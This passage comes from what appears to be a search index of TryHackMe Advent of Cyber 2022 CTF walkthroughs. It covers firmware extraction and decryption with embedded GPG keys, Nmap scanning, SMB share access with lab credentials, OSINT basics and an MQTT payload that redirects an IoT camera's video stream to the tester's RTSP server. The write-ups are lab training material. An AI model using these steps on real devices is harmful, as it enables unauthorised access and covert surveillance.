11:14:32\n\nExtracting 1180160 bytes of tp-link header image at offset 0\nExtracting squashfs file system at offset 1180160\n3994112\n3994112\n0\nExtracting squashfs files...\nFirmware extraction successful!\nFirmware parts can be found in '/home/test/bin-unsigned/fmk/*'\n</code></pre>"},{"location":"walkthroughs/thm/adventofcyber2022/day20/#step-3-finding-encryption-keys","title":"Step 3 - Finding Encryption Keys","text":"<p>The original firmware is <code>GPG</code> protected (as per the narrative). We need to find a public and private key and a paraphrase to decrypt the originally signed firmware. The unencrypted firmware is extracted successfully and stored in the <code>fmk</code> folder (as per the last Step 2). Let's search for the public and private key as well as the paraphrase in the extracted firmware.</p> <pre><code>test@ip-10-10-204-137:~/bin-unsigned/fmk$ grep -ir 'pgp'\nrootfs/gpg/public.key:-----BEGIN PGP PUBLIC KEY BLOCK-----\nrootfs/gpg/public.key:-----END PGP PUBLIC KEY BLOCK-----\nrootfs/gpg/private.key:-----BEGIN PGP PRIVATE KEY BLOCK-----\nrootfs/gpg/private.key:-----END PGP PRIVATE KEY BLOCK-----\n\ntest@ip-10-10-204-137:~/bin-unsigned/fmk$ grep -ir 'paraphrase'\nrootfs/gpg/secret.txt:PARAPHRASE: Santa@2022\n</code></pre>"},{"location":"walkthroughs/thm/adventofcyber2022/day20/#step-4-decrypting-the-encrypted-firmware","title":"Step 4 - Decrypting the Encrypted Firmware","text":"<p>Let's import the keys using the following command:</p> <pre><code>test@ip-10-10-204-137:~/bin-unsigned$ gpg --import fmk/rootfs/gpg/private.key\ngpg: key 56013838A8C14EC1: secret key imported\ngpg: Total number processed: 1\ngpg:               imported: 1\ngpg:       secret keys read: 1\ngpg:   secret keys imported: 1\n\ntest@ip-10-10-204-137:~/bin-unsigned$ gpg --import fmk/rootfs/gpg/public.key \ngpg: key 56013838A8C14EC1: \"McSkidy &lt;mcskidy@santagift.shop&gt;\" not changed\ngpg: Total number processed: 1\ngpg:              unchanged: 1\n</code></pre> <p>Verify the keys are exported:</p> <pre><code>test@ip-10-10-204-137:~/bin-unsigned$ gpg --list-secret-keys \n/home/test/.gnupg/pubring.kbx\n-----------------------------\nsec   rsa3072 2022-11-17 [SC] [expires: 2024-11-16]\n      514B4994E9B3E47A4F89507A56013838A8C14EC1\nuid           [ unknown] McSkidy &lt;mcskidy@santagift.shop&gt;\nssb   rsa3072 2022-11-17 [E] [expires: 2024-11-16]\n</code></pre> <p>Let's decrypt the encrypted firmware binary with the above keys.</p> <pre><code>test@ip-10-10-204-137:~/bin$ gpg firmwarev2.2-encrypted.gpg\ngpg: WARNING: no command supplied.  Trying to guess what you mean ...\ngpg: encrypted with 3072-bit RSA key, ID 1A2D5BB2F7076FA8, created 2022-11-17\n      \"McSkidy \"\n\ntest@ip-10-10-204-137:~/bin$ ls -la\ntotal 7528\ndrwxrwxr-x 2 test test    4096 Dec 20 18:07 .\ndrwxr-xr-x 8 test test    4096 Nov 23 18:01 ..\n-rw-rw-r-- 1 test test 3990016 Dec 20 18:07 firmwarev2.2-encrypted\n-rw-rw-r-- 1 test test 3705655 Dec  1 05:45 firmwarev2.2-encrypted.gpg\n</code></pre> <p>With the firmware decrypted, we can now use either <code>binwalk</code> or <code>FMK</code> to extract the code. Let's use <code>FMK</code>.</p> <pre><code>test@ip-10-10-204-137:~/bin$ extract-firmware.sh firmwarev2.2-encrypted\nFirmware Mod Kit (extract) 0.99, (c)2011-2013 Craig Heffner, Jeremy Collake\n\nScanning firmware...\n\nScan Time:     2022-12-20 18:15:37\nTarget File:   /home/test/bin/firmwarev2.2-encrypted\nMD5 Checksum:  714c30af5db1e156e35b374f87c59d6f\nSignatures:    344\n\nDECIMAL       HEXADECIMAL     DESCRIPTION\n--------------------------------------------------------------------------------\n0             0x0             TP-Link firmware header, firmware version: 0.-15360.3, image ver\nsion: \"\", product ID: 0x0, product version: 138412034, kernel load address: 0x0, kernel entry \npoint: 0x80002000, kernel offset: 4063744, kernel length: 512, rootfs offset: 849104, rootfs l\nength: 1048576, bootloader offset: 2883584, bootloader length: 0\n13344         0x3420          U-Boot version string, \"U-Boot 1.1.4 (Apr  6 2016 - 11:12:23)\"\n13392         0x3450          CRC32 polynomial table, big endian\n14704         0x3970          uImage header, header size: 64 bytes, header CRC: 0x5A946B00, cr\neated: 2016-04-06 03:12:24, image size: 35920 bytes, Data Address: 0x80010000, Entry Point: 0x\n80010000, data CRC: 0x510235FE, OS: Linux, CPU: MIPS, image type: Firmware Image, compression \ntype: lzma, image name: \"u-boot image\"\n14768         0x39B0          LZMA compressed data, properties: 0x5D, dictionary size: 3355443\n2 bytes, uncompressed size: 93944 bytes\n131584        0x20200         TP-Link firmware header, firmware version: 0.0.3, image version:\n \"\", product ID: 0x0, product version: 138412034, kernel load address: 0x0, kernel entry point\n: 0x80002000, kernel offset: 3932160, kernel length: 512, rootfs offset: 849104, rootfs length\n: 1048576, bootloader offset: 2883584, bootloader length: 0\n132096        0x20400         LZMA compressed data, properties: 0x5D, dictionary size: 3355443\n2 bytes, uncompressed size: 2494744 bytes\n1180160       0x120200        Squashfs filesystem, little endian, version 4.0, compression:lzm\na, size: 2809007 bytes, 605 inodes, blocksize: 131072 bytes, created: 2022-12-01 05:42:58\n\nExtracting 1180160 bytes of tp-link header image at offset 0\nExtracting squashfs file system at offset 1180160\n3990016\n3990016\n0\nExtracting squashfs files...\nFirmware extraction successful!\nFirmware parts can be found in '/home/test/bin/fmk/*'\n</code></pre> <p>The flag can be found under <code>/home/test/bin/fmk/rootfs/flag.txt</code>: <code>THM{WE_GOT_THE_FIRMWARE_CODE}</code></p> <p>Using the <code>ls -lah *</code> command, we can find the build-number of <code>rootfs</code>: <code>2.6.31</code></p>"},{"location":"walkthroughs/thm/adventofcyber2022/day21/","title":"Day 21 - MQTT","text":""},{"location":"walkthroughs/thm/adventofcyber2022/day21/#introduction-to-iot","title":"Introduction to IoT","text":"<p>An IoT protocol refers to any protocol used by an IoT device for <code>machine-to-machine</code>, <code>machine-to-gateway</code>, or <code>machine-to-cloud</code> communication. IoT protocols can be characterized into one of two types: <code>IoT data protocol</code> or <code>IoT network protocol</code>.</p> <p><code>IoT data protocol</code> commonly relies on <code>TCP/IP</code> model. <code>IoT network protocol</code> relies on wireless technology for communication (ie. WiFi, Bluetooth, Zigbee, Z-Wave, etc.).</p>"},{"location":"walkthroughs/thm/adventofcyber2022/day21/#messaging-protocols-and-middleware","title":"Messaging Protocols and Middleware","text":"<p>Messaging protocols communicate between two devices through an independent lightweight and efficient middleware server  or by negotiating a communication method amongst themselves. The server is place din between the two clients who want to communicate to translate the communication to a method both devices can understand.</p> <pre><code>graph LR;\n    A[Client A] --IoT Protocol--&gt;B[Middleware];\n    B--IoT Protocol--&gt;A;\n    B--HTTP Data--&gt;C[Client B];\n    C--HTTP Data--&gt;B;</code></pre> <p>The table below shows examples of popular protocols used by IoT devices.</p> Protocol Communication Method Description MQTT (Message Queuing Telemetry Transport) Middleware A lightweight protocol that relies on a publish/subscribe model to send or receive messages. CoAP (Constrained Application Protocol) Middleware Translates HTTP communication to a usable communication medium for lightweight devices. AMQP (Advanced Message Queuing Protocol) Middleware Acts as a transactional protocol to receive, queue, and store messages/payloads between devices. DDS (Data Distribution Service) Middleware A scalable protocol that relies on a publish/subscribe model to send or receive messages. HTTP Device-to-Device Used as a communication method from traditional devices to lightweight devices or for large data communication. WebSocket Device-to-Device Relies on a client-server model to send data over a TCP connection."},{"location":"walkthroughs/thm/adventofcyber2022/day21/#functionality-of-a-publishsubscribe-model","title":"Functionality of a Publish/Subscribe Model","text":"<p>Message protocols commonly use a <code>publish/subscribe</code> model such as <code>MQTT</code>. This model relies on a broker to negotiate <code>published</code> messages and <code>subscription</code> queries. </p> <pre><code>graph LR;\n  A[Publisher]--Message from Publisher--&gt;B[Broker];\n  B--Message from Publisher--&gt;C[Subscriber];\n  C--Message Query--&gt;B;</code></pre> <p>Based on the above diagram:</p> <ol> <li>A publisher sends their message to a broker.</li> <li>The broker continues relaying the message until a new message is published.</li> <li>A subscriber can attempt to connect to a broker and receive a message.</li> </ol> <p>A broker can store multiple messages from different publishers by using <code>topics</code>. A <code>topic</code> is a semi-arbitrary value pre-negotiated by the publisher and subscriber and sent along with a message. The format of a <code>topic</code> commonly takes the form of <code>&lt;name&gt;/&lt;id&gt;/&lt;function&gt;</code>. When a new message is sent with a given topic, the broker will store/overwrite it under the topic and relay it to the subscribers who have subscribed to it.</p> <p>The diagram below shows two publishers sending different messages associated with <code>topics</code>.</p> <pre><code>graph LR;\n    A[Publisher A]--Message: ABCD&lt;br&gt;Topic: A--&gt;B[Broker&lt;br&gt;Topic: A&lt;br&gt;Message: ABCD&lt;br&gt;Topic: B&lt;br&gt;Message: 1234];\n    C[Publisher B]--Message: 1234&lt;br&gt;Topic: B--&gt;B;</code></pre> <p>The diagram below shows two subscribers receiving messages from separate topics of a broker.</p> <pre><code>graph LR;\n    A[Broker&lt;br&gt;Topic: A&lt;br&gt;Message: ABCD&lt;br&gt;Topic: B&lt;br&gt;Message: 1234]--Message: ABCD--&gt;B[Subscriber A];\n    B--Are there messages from topic A?--&gt;A;\n    A--Message: 1234--&gt;C[Subscriber B];\n    C--Are there messages from topic B?--&gt;A;</code></pre> <p>Note that this method of communication is asynchronous as the publisher can publish at any time and the subscriber can subscribe to a topic to see if the broker relayed messages.</p>"},{"location":"walkthroughs/thm/adventofcyber2022/day21/#interacting-with-mqtt","title":"Interacting with MQTT","text":"<p>Two commonly used libraries for interacting with MQTT are: <code>Paho</code> and <code>Mosquitto</code>.</p> <p><code>Paho</code> is a python library that offers support for all features of MQTT. <code>Mosquitto</code> is a suite of MQTT utilities that include a broker and publish/subscribe clients which can be used from the command line.</p>"},{"location":"walkthroughs/thm/adventofcyber2022/day21/#subscribing-to-a-topic","title":"Subscribing to a Topic","text":"<p>The mosquitto_sub client utility can be used to subscribe to an MQTT broker. By default, the subscription utility will connect a localhost broker and only require a topic to be defined using <code>-t</code> or <code>--topic</code>. Following is an example of connecting to a localhost and subscribing to the topic device/ping: <code>mosquito_sub -t device/ping</code>.</p> <p>A remote broker can be specified using the <code>-h</code> flag: <code>mosquitto_sub -h example.com -t device/thm</code>.</p>"},{"location":"walkthroughs/thm/adventofcyber2022/day21/#publishing-to-a-topic","title":"Publishing to a Topic","text":"<p>The mosquitto_pub client utility can be used to publish to an MQTT broker.</p> <p>To publish a message to a topic, <code>-m</code> or <code>--message</code> flag can be used: <code>mosquitto_pub -h example.com -t device/info -m \"This is an example\"</code>.</p> <p>The following are several common optional flags used by both clients: - <code>-d</code>: Enables debug messages. - <code>-i</code> or <code>--id</code>: Specifies the id to identify the client to the server. - <code>-p</code> or <code>--port</code>: Specifies the port the broker is using (Defaults to port 1883). - <code>-u</code> or <code>--username</code>: Specifies the username for authentication. - <code>-P</code> or <code>--password</code>: Specifies the password for authentication. - <code>--url</code>: Specifies username, password, host, port, and topic in one URL.</p>"},{"location":"walkthroughs/thm/adventofcyber2022/day21/#ctf-questions","title":"CTF Questions","text":"<p>Let's verify that the machine is acting as an MQTT endpoint using Nmap.</p> <p><pre><code>$ nmap -sC -sV -p- 10.10.96.87 --min-rate 1500\nStarting Nmap 7.93 ( https://nmap.org ) at 2022-12-21 15:31 MST\nVerbosity Increased to 1.\nVerbosity Increased to 2.\nCompleted Service scan at 15:33, 56.56s elapsed (3 services on 1 host)\nNSE: Script scanning 10.10.96.87.\nNSE: Starting runlevel 1 (of 3) scan.\nInitiating NSE at 15:33\nCompleted NSE at 15:33, 9.53s elapsed\nNSE: Starting runlevel 2 (of 3) scan.\nInitiating NSE at 15:33\nCompleted NSE at 15:33, 0.51s elapsed\nNSE: Starting runlevel 3 (of 3) scan.\nInitiating NSE at 15:33\nCompleted NSE at 15:33, 0.01s elapsed\nNmap scan report for 10.10.96.87\nHost is up (0.19s latency).\nScanned at 2022-12-21 15:31:34 MST for 125s\nNot shown: 65531 closed tcp ports (conn-refused)\nPORT      STATE    SERVICE                 VERSION\n22/tcp    open     ssh                     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 1d8ec8ced4351ab2906a9f2f88248fad (RSA)\n| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDIZDobO9iT4Uy6UdlhLCDDB3h7wIg9/DgcDtYRVhluAzWv924ulvlMfVwrsaKCIQ8eJp1jZnbfeIwVOChpWbAM5RPGCnmrZEiJWoKQkgXgDDjOm9+a5oIrvQULpSGXcI5wwmTPNF/8d5R+PJV8xXbY77+X+SwEfLBFcnBtsg307smvEguSFGx64frIKKpof5E8AKRxI5PfNmQtTyIsIE8PBErHr4sB2HXEYwUZc5Hput8NaWn3U8ZjrTPq3ma5Z8Nsrwyw5KoI9nycQ9YD0DX+X5iQBnybz54II3lFhT9WWMS3MgrnfSoyFECCAB+IE5kDwuPreVNCz9slYqG6rsVAQ3lG0fwklxAYvYZEhe27a0t+QRMzMxPoiPq0TDrNYum16/9qywEAK5z4AKiCHKgCQdzEdWNyWu3Z9mOZC3GiokEEZ48ZstvxryNDmoAZ8S3tvuDb3jKStlz3guunfJjMwq8aSzwPNJOGl5IKHQg7S1rDtZD1yuinvQfwEBnD2mM=\n|   256 910f21f62ea7e3d42aa5d8d8b712df1a (ECDSA)\n| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIe4xxx3L6HrLMkV9lcwOvpvtjrCfCp4vVaFKBp1IyCiSYrlLQhzBoPZvpntZq7fgpFN0mWTwlzegeVZlfQ5mDY=\n|   256 40ead4bfe2d14b9d7b5722793f9b88fc (ED25519)\n|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKCR97uJNCnjGlaEJg9+yFMl6XvewoQSykPtffjN3PAY\n80/tcp    open     http                    WebSockify Python/3.8.10\n| fingerprint-strings: \n|   GetRequest: \n|     HTTP/1.1 405 Method Not Allowed\n|     Server: WebSockify Python/3.8.10\n|     Date: Wed, 21 Dec 2022 22:32:37 GMT\n|     Connection: close\n|     Content-Type: text/html;charset=utf-8\n|     Content-Length: 472\n|     &lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\"\n|     \"http://www.w3.org/TR/html4/strict.dtd\"&gt;\n|     &lt;html&gt;\n|     &lt;head&gt;\n|     &lt;meta http-equiv=\"Content-Type\" content=\"text/html;charset=utf-8\"&gt;\n|     &lt;title&gt;Error response&lt;/title&gt;\n|     &lt;/head&gt;\n|     &lt;body&gt;\n|     &lt;h1&gt;Error response&lt;/h1&gt;\n|     &lt;p&gt;Error code: 405&lt;/p&gt;\n|     &lt;p&gt;Message: Method Not Allowed.&lt;/p&gt;\n|     &lt;p&gt;Error code explanation: 405 - Specified method is invalid for this resource.&lt;/p&gt;\n|     &lt;/body&gt;\n|     &lt;/html&gt;\n|   HTTPOptions: \n|     HTTP/1.1 501 Unsupported method ('OPTIONS')\n|     Server: WebSockify Python/3.8.10\n|     Date: Wed, 21 Dec 2022 22:32:38 GMT\n|     Connection: close\n|     Content-Type: text/html;charset=utf-8\n|     Content-Length: 500\n|     &lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\"\n|     \"http://www.w3.org/TR/html4/strict.dtd\"&gt;\n|     &lt;html&gt;\n|     &lt;head&gt;\n|     &lt;meta http-equiv=\"Content-Type\" content=\"text/html;charset=utf-8\"&gt;\n|     &lt;title&gt;Error response&lt;/title&gt;\n|     &lt;/head&gt;\n|     &lt;body&gt;\n|     &lt;h1&gt;Error response&lt;/h1&gt;\n|     &lt;p&gt;Error code: 501&lt;/p&gt;\n|     &lt;p&gt;Message: Unsupported method ('OPTIONS').&lt;/p&gt;\n|     &lt;p&gt;Error code explanation: HTTPStatus.NOT_IMPLEMENTED - Server does not support this operation.&lt;/p&gt;\n|     &lt;/body&gt;\n|_    &lt;/html&gt;\n|_http-title: Error response\n|_http-server-header: WebSockify Python/3.8.10\n1883/tcp  open     mosquitto version 1.6.9\n| mqtt-subscribe: \n|   Topics and their most recent payloads: \n|     $SYS/broker/uptime: 1122 seconds\n|     $SYS/broker/load/bytes/sent/5min: 535.67\n|     $SYS/broker/publish/bytes/sent: 2408\n|     $SYS/broker/clients/active: 5\n|     $SYS/broker/publish/messages/received: 111\n|     $SYS/broker/load/publish/received/1min: 5.66\n|     $SYS/broker/messages/sent: 214\n|     $SYS/broker/clients/inactive: 0\n|     $SYS/broker/clients/connected: 5\n|     $SYS/broker/store/messages/count: 43\n|     $SYS/broker/publish/messages/sent: 152\n|     $SYS/broker/clients/disconnected: 0\n|     $SYS/broker/messages/received: 173\n|     $SYS/broker/load/connections/1min: 1.35\n|     $SYS/broker/load/messages/received/1min: 11.07\n|     $SYS/broker/heap/current: 58504\n|     $SYS/broker/version: mosquitto version 1.6.9\n|     $SYS/broker/load/publish/sent/1min: 43.12\n|     $SYS/broker/bytes/received: 4167\n|     $SYS/broker/load/messages/received/15min: 6.63\n|     $SYS/broker/load/bytes/received/1min: 259.01\n|     $SYS/broker/subscriptions/count: 4\n|     $SYS/broker/load/sockets/5min: 0.53\n|     $SYS/broker/messages/stored: 43\n|     $SYS/broker/store/messages/bytes: 200\n|     $SYS/broker/retained messages/count: 46\n|     $SYS/broker/bytes/sent: 5685\n|     $SYS/broker/load/connections/5min: 0.38\n|     device/init: S2INBJXRDQFDF90VNXU6\n|     $SYS/broker/load/publish/sent/15min: 6.95\n|     $SYS/broker/load/sockets/1min: 1.58\n|     $SYS/broker/load/sockets/15min: 0.25\n|     $SYS/broker/load/publish/sent/5min: 13.82\n|     $SYS/broker/clients/total: 4\n|     $SYS/broker/load/bytes/sent/1min: 1728.47\n|     $SYS/broker/load/bytes/received/5min: 221.28\n|     $SYS/broker/load/bytes/sent/15min: 263.32\n|     $SYS/broker/load/messages/sent/15min: 9.34\n|     $SYS/broker/heap/maximum: 58904\n|     $SYS/broker/load/publish/received/5min: 5.76\n|     $SYS/broker/load/messages/sent/5min: 17.36\n|     $SYS/broker/load/publish/received/15min: 4.23\n|     $SYS/broker/load/messages/sent/1min: 48.54\n|     $SYS/broker/clients/maximum: 4\n|     $SYS/broker/load/messages/received/5min: 9.30\n|     $SYS/broker/publish/bytes/received: 2220\n|     $SYS/broker/load/connections/15min: 0.19\n|_    $SYS/broker/load/bytes/received/15min: 158.81\n42184/tcp filtered unknown\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port80-TCP:V=7.93%I=7%D=12/21%Time=63A38984%P=x86_64-pc-linux-gnu%r(Get\nSF:Request,291,\"HTTP/1\\.1\\x20405\\x20Method\\x20Not\\x20Allowed\\r\\nServer:\\x2\nSF:0WebSockify\\x20Python/3\\.8\\.10\\r\\nDate:\\x20Wed,\\x2021\\x20Dec\\x202022\\x2\nSF:022:32:37\\x20GMT\\r\\nConnection:\\x20close\\r\\nContent-Type:\\x20text/html;\nSF:charset=utf-8\\r\\nContent-Length:\\x20472\\r\\n\\r\\n&lt;!DOCTYPE\\x20HTML\\x20PUB\nSF:LIC\\x20\\\"-//W3C//DTD\\x20HTML\\x204\\.01//EN\\\"\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x\nSF:20\\x20\\\"http://www\\.w3\\.org/TR/html4/strict\\.dtd\\\"&gt;\\n&lt;html&gt;\\n\\x20\\x20\\x\nSF:20\\x20&lt;head&gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20&lt;meta\\x20http-equiv=\\\"Con\nSF:tent-Type\\\"\\x20content=\\\"text/html;charset=utf-8\\\"&gt;\\n\\x20\\x20\\x20\\x20\\x\nSF:20\\x20\\x20\\x20&lt;title&gt;Error\\x20response&lt;/title&gt;\\n\\x20\\x20\\x20\\x20&lt;/head&gt;\nSF:\\n\\x20\\x20\\x20\\x20&lt;body&gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20&lt;h1&gt;Error\\x20\nSF:response&lt;/h1&gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20&lt;p&gt;Error\\x20code:\\x20405\nSF:&lt;/p&gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20&lt;p&gt;Message:\\x20Method\\x20Not\\x20A\nSF:llowed\\.&lt;/p&gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20&lt;p&gt;Error\\x20code\\x20expla\nSF:nation:\\x20405\\x20-\\x20Specified\\x20method\\x20is\\x20invalid\\x20for\\x20t\nSF:his\\x20resource\\.&lt;/p&gt;\\n\\x20\\x20\\x20\\x20&lt;/body&gt;\\n&lt;/html&gt;\\n\")%r(HTTPOptio\nSF:ns,2B9,\"HTTP/1\\.1\\x20501\\x20Unsupported\\x20method\\x20\\('OPTIONS'\\)\\r\\nS\nSF:erver:\\x20WebSockify\\x20Python/3\\.8\\.10\\r\\nDate:\\x20Wed,\\x2021\\x20Dec\\x\nSF:202022\\x2022:32:38\\x20GMT\\r\\nConnection:\\x20close\\r\\nContent-Type:\\x20t\nSF:ext/html;charset=utf-8\\r\\nContent-Length:\\x20500\\r\\n\\r\\n&lt;!DOCTYPE\\x20HT\nSF:ML\\x20PUBLIC\\x20\\\"-//W3C//DTD\\x20HTML\\x204\\.01//EN\\\"\\n\\x20\\x20\\x20\\x20\\\nSF:x20\\x20\\x20\\x20\\\"http://www\\.w3\\.org/TR/html4/strict\\.dtd\\\"&gt;\\n&lt;html&gt;\\n\\\nSF:x20\\x20\\x20\\x20&lt;head&gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20&lt;meta\\x20http-eq\nSF:uiv=\\\"Content-Type\\\"\\x20content=\\\"text/html;charset=utf-8\\\"&gt;\\n\\x20\\x20\\\nSF:x20\\x20\\x20\\x20\\x20\\x20&lt;title&gt;Error\\x20response&lt;/title&gt;\\n\\x20\\x20\\x20\\x\nSF:20&lt;/head&gt;\\n\\x20\\x20\\x20\\x20&lt;body&gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20&lt;h1&gt;\nSF:Error\\x20response&lt;/h1&gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20&lt;p&gt;Error\\x20cod\nSF:e:\\x20501&lt;/p&gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20&lt;p&gt;Message:\\x20Unsupport\nSF:ed\\x20method\\x20\\('OPTIONS'\\)\\.&lt;/p&gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20&lt;p\nSF:&gt;Error\\x20code\\x20explanation:\\x20HTTPStatus\\.NOT_IMPLEMENTED\\x20-\\x20S\nSF:erver\\x20does\\x20not\\x20support\\x20this\\x20operation\\.&lt;/p&gt;\\n\\x20\\x20\\x2\nSF:0\\x20&lt;/body&gt;\\n&lt;/html&gt;\\n\");\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nNSE: Script Post-scanning.\nNSE: Starting runlevel 1 (of 3) scan.\nInitiating NSE at 15:33\nCompleted NSE at 15:33, 0.00s elapsed\nNSE: Starting runlevel 2 (of 3) scan.\nInitiating NSE at 15:33\nCompleted NSE at 15:33, 0.00s elapsed\nNSE: Starting runlevel 3 (of 3) scan.\nInitiating NSE at 15:33\nCompleted NSE at 15:33, 0.00s elapsed\nRead data files from: /usr/bin/../share/nmap\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 127.98 seconds\n</code></pre> MQTT is running on port <code>1883</code>. Mosquito version <code>1.6.9</code> is running.</p> <p>Subscribe to <code>device/init</code> topic to enumerate the device and obtain the device ID. Alternatively, we can find the device ID from the Nmap output as well: <code>device/init: S2INBJXRDQFDF90VNXU6</code></p> <pre><code>$ mosquitto_sub -h 10.10.96.87 -t device/init\nS2INBJXRDQFDF90VNXU6\n</code></pre> <p>Start an RTSP server using rtsp-simple-server.</p> <p><pre><code>$ docker run --rm -it --network=host aler9/rtsp-simple-server\nUnable to find image 'aler9/rtsp-simple-server:latest' locally\nlatest: Pulling from aler9/rtsp-simple-server\nd7c47958dda1: Pull complete \nDigest: sha256:44ce06f758a74f316ae4d912706c5212af2fb4765137e119ff689c5ec327dc94\nStatus: Downloaded newer image for aler9/rtsp-simple-server:latest\n2022/12/21 22:56:19 INF rtsp-simple-server v0.21.0\n2022/12/21 22:56:19 INF [RTSP] listener opened on :8554 (TCP), :8000 (UDP/RTP), :8001 (UDP/RTCP)\n2022/12/21 22:56:19 INF [RTMP] listener opened on :1935\n2022/12/21 22:56:19 INF [HLS] listener opened on :8888\n2022/12/21 22:56:19 INF [WebRTC] listener opened on :8889\n</code></pre> RTSP server running on port <code>8554</code>. </p> <p>Publish our payload to <code>device/S2INBJXRDQFDF9/cmd</code> topic. The required format based on the source code is <code>{\"CMD\":\"value\",\"URL\":\"Value\"}</code>. We can use a dummy path <code>testpath</code>.</p> <pre><code>$ mosquitto_pub -h 10.10.96.87 -t device/S2INBJXRDQFDF9/cmd -m \"\"\"{\"cmd\":\"10\",\"url\":\"rtsp://10.10.5.170:8554/testpath\"}\"\"\"\n</code></pre> <p>RTSP server shows a connection back from the camera.</p> <pre><code>2022/12/21 23:11:55 INF [RTSP] [conn 10.10.96.87:41498] opened\n2022/12/21 23:11:55 INF [RTSP] [session 9ff80905] created by 10.10.96.87:41498\n2022/12/21 23:11:55 INF [RTSP] [session 9ff80905] is publishing to path 'testpath', with UDP, 1 track (H264)\n</code></pre> <p>Let's view the stream by running VLC and opening the server path of the locally hosted RTSP server.</p> <pre><code>$ vlc rtsp://127.0.0.01:8554/testpath\n</code></pre>"},{"location":"walkthroughs/thm/adventofcyber2022/day3/","title":"Day 03 - OSINT","text":""},{"location":"walkthroughs/thm/adventofcyber2022/day3/#introduction","title":"Introduction","text":"<p>Note</p> <p>OSINT is gathering and analysing publicly available data for intelligence purposes, which includes information collected from the internet, mass media, specialist journals and research, photos, and geospatial information. The information can be accessed via the open internet (indexed by search engines), closed forums (not indexed by search engines) and even the deep and dark web. People tend to leave much information on the internet that is publicly available and later on results in impersonation, identity theft etc.</p>"},{"location":"walkthroughs/thm/adventofcyber2022/day3/#osint-techniques","title":"OSINT Techniques","text":""},{"location":"walkthroughs/thm/adventofcyber2022/day3/#google-dorks","title":"Google Dorks","text":"<p>Following are the most commonly used Google dorks:</p> <ul> <li> <p>inurl: Searches for a specified text in all indexed URLs. For example, <code>inurl:hacking</code> will fetch all URLs containing the word \"hacking\".</p> </li> <li> <p>filetype: Searches for specified file extensions. For example, <code>filetype:pdf \"hacking\"</code> will bring all pdf files containing the word \"hacking\". </p> </li> <li> <p>site: Searches all the indexed URLs for the specified domain. For example, <code>site:tryhackme.com</code> will bring all the indexed URLs from  tryhackme.com.</p> </li> <li> <p>cache: Get the latest cached version by the Google search engine. For example, <code>cache:tryhackme.com</code>.</p> </li> </ul> <p>Tip</p> <p>See also: Google Dork Cheatsheet by SANS Institute</p>"},{"location":"walkthroughs/thm/adventofcyber2022/day3/#whois-lookup","title":"WHOIS Lookup","text":"<p>WHOIS database stores public domain information in a centralised database. The database is publicly available and enables acquiring Personal Identifiable Information (PII) against a company.</p> <p>Registrars do offer <code>Domain Privacy</code> options that allow users to keep their WHOIS information private from the general public and only accessible to certain entities like designated registrars. </p>"},{"location":"walkthroughs/thm/adventofcyber2022/day3/#robotstxt","title":"Robots.txt","text":"<p>A <code>robots.txt</code> file tells search engine crawlers which URLs the crawler can access on a site. All websites have their <code>robots.txt</code> file directly accessible through the domain's main URL (ie. <code>www.example.com/robots.txt</code>).</p>"},{"location":"walkthroughs/thm/adventofcyber2022/day3/#breached-database-search","title":"Breached Database Search","text":"<p>Databases such as <code>https://haveibeenpwned.com/</code> allow search of leaked databases often containing PII like usernames, passwords, addresses, phone numbers, and other identifiable private information regarding individuals. These databases enable successful password spraying due to tendencies of individuals to re-use passwords.</p>"},{"location":"walkthroughs/thm/adventofcyber2022/day3/#ctf-questions","title":"CTF Questions","text":"<p>Successfully found GitHub repo SantaGiftShop.</p> <p>The flag <code>`{THM_OSINT_WORKS}</code> is located under the <code>config.php</code> file which also contains answers to the rest of the questions.</p>"},{"location":"walkthroughs/thm/adventofcyber2022/day4/","title":"Day 04 - Scanning","text":""},{"location":"walkthroughs/thm/adventofcyber2022/day4/#introduction","title":"Introduction","text":"<p>The challenge of the day requires the user to login to SMB using provided credentials. The answers are located in the files (<code>flag.txt</code> and <code>userlist.txt</code>) in the <code>admins</code> share.</p> <p>Target IP = 10.10.241.147 ($IP)  Username = ubuntu  Password = S@nta2022</p> <pre><code>\u250c\u2500\u2500(siachen\u327fkali)-[~]\n\u2514\u2500$ smbclient -L //$IP                     \nPassword for [WORKGROUP\\siachen]:\n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        print$          Disk      Printer Drivers\n        sambashare      Disk      Samba on Ubuntu\n        admins          Disk      Samba on Ubuntu\n        IPC$            IPC       IPC Service (ip-10-10-241-147 server (Samba, Ubuntu))\nReconnecting with SMB1 for workgroup listing.\n\n        Server               Comment\n        ---------            ----\n---\n\n        Workgroup            Master\n        ---------            -------\n        WORKGROUP            \n\n\u250c\u2500\u2500(siachen\u327fkali)-[~]\n\u2514\u2500$ smbclient //$IP/admins -U ubuntu        \nPassword for [WORKGROUP\\ubuntu]:\nTry \"help\" to get a list of possible commands.\nsmb: \\&gt; dir\n  .                                   D        0  Wed Nov  9 22:44:30 2022\n  ..                                  D        0  Wed Nov  9 10:43:21 2022\n  flag.txt                            A       23  Wed Nov  9 10:55:58 2022\n  userlist.txt                        A      111  Wed Nov  9 22:44:29 2022\n\n                40581564 